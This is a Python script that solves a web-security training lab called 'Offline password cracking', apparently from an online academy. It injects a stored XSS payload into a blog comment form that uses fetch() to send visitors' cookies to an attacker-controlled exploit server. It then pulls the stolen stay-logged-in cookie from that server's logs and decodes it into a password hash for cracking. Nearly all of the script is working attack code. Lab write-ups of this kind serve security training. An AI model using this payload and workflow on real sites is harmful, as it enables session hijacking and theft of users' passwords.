##############################################################
#
# Author: Ahmed Elqalawii
#
# Date: 30/8/2023
#
# Lab: Offline password cracking
#
# Steps: 1. Exploit XSS vulnerability in comment functionlity
#        2. Extract victim cookie from the exploit server logs
#        3. Decode the cookie to get the hashed password
#        4. Crack the hash to get the plain password
#
###############################################################

###########
# imports
###########
import requests
import re
from colorama import Fore
import base64

# change this url to your lab
url = "https://0aae0015043c699e82c475ae00ce0062.web-security-academy.net"
# change this url to your exploit server
exploit_server_url = "https://exploit-0aa8004804046931820674d701c00032.exploit-server.net"


#######################################################
# Function used to inject XSS in comment functionality
#######################################################
def exploit_xss_in_comment_functionality(url, exploit_server_url):
    data = {
        "postId": "2",
        "comment": f"<script>fetch('{exploit_server_url}/exploit?cookie=' + document.cookie)</script/> Exploited!",
        "name": "Hacker",
        "email": "hacker@hacker.me",
        "website": ""
    }
    try:
        res = requests.post(f"{url}/post/comment", data)
        if res.status_code == 200:
            print(Fore.WHITE + "1. Exploit XSS in comment functionality.. ☑️")
            return True
        else:
            return False
    except:
        print(Fore.RED + "Failed to exploit XSS through exception")


##################################################################
# Function used to extract the cookie from the exploit sever logs
##################################################################
def extract_cookie_from_logs(exploit_server_url):
    try:
        res = requests.get(f"{exploit_server_url}/log")
        if res.status_code == 200:
            cookie = re.findall("stay-logged-in=(.*) HTTP", res.text)
            if len(cookie) != 0:
                print(
                    Fore.WHITE + "2. Get stay-logged-in cookie of the victim from exploit sever logs.. ☑️")
                return cookie[0]
            else:
                return None
        else:
            print(Fore.RED + "Failed to extract the cookie from the logs")
    except:
        print(Fore.RED + "Failed to GET the /log from the server")


###############################
# Starting point of the script
###############################
is_exploited = exploit_xss_in_comment_functionality(url, exploit_server_url) # try to inject the XSS payload
if is_exploited: # if the payload is injected successfully
    cookie = extract_cookie_from_logs(exploit_server_url) # try to extract the cookie from your server logs
    if cookie != None: # if you found the cookie
        print(Fore.WHITE + "3. Decoding the encrypted cookie.. ☑️")
        decrypt = base64.b64decode(cookie).decode() # decode the cookie to get the hash
        hash = decrypt.split(":")[1] # split the decoded string to obtain the hash only without the username
        print(Fore.YELLOW + "✅ Password hash: " + Fore.GREEN + hash)
        print(Fore.WHITE + "Crack this hash using any online hash cracker")
    else:
        print(Fore.RED + "No cookies are found is the logs")
else:
    print(Fore.RED + "Failed to inject XSS in the comment")
